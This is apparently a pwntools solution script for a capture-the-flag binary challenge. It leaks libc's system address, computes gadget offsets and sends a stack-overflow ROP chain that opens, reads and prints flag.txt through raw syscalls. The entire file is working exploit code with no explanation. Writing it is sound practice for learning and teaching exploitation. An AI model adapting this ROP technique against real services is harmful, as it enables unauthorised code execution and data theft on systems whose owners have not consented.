from pwn import *

exe = './chall_patched'
libc_path = 'libc.so.6'
ld_path = 'ld-linux-x86-64.so.2'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF(libc_path, checksec=True)
ld = ELF(ld_path, checksec=True)

host = 'challs.pwnoh.io'
port = 13371

context.terminal = ['tmux', 'splitw', '-h']

## r = process(exe, level='DEBUG')

r = remote(host, port)

gs = ''' 
break *vuln
continue
'''
## r = gdb.debug(exe, gdbscript=gs)

r.recvuntil(b"Try it yourself: it's at")
system_leak = int(r.recvline().strip().decode(), 16)

libc.address = system_leak - libc.sym['system']

print(hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh'))
pop_rax_ret = libc.address + 0x045eb0
pop_rdi_ret = libc.address + 0x02a3e5
pop_rsi_ret = libc.address + 0x02be51
pop_rdx_rbx_ret = libc.address + 0x0904a9
syscall = libc.address + 0x091316
ret = libc.address + 0x1bc065

target_address = 0x7ffff7fadf00 - 0x7ffff7d92000 + libc.address

## exploit payload
payload = b'A' * 0x28

## write 'flag.txt' in libc data section
payload += p64(pop_rdi_ret)
payload += p64(target_address)
payload += p64(libc.sym['gets'])

## open 'flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(target_address)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(2)
payload += p64(syscall)

## read './flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(pop_rsi_ret)
payload += p64(target_address)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0xff)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(syscall)

## write './flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_ret)
payload += p64(target_address)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0xff)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(1)
payload += p64(syscall)

r.sendline(payload)
r.sendline(b'flag.txt\x00')


r.interactive()

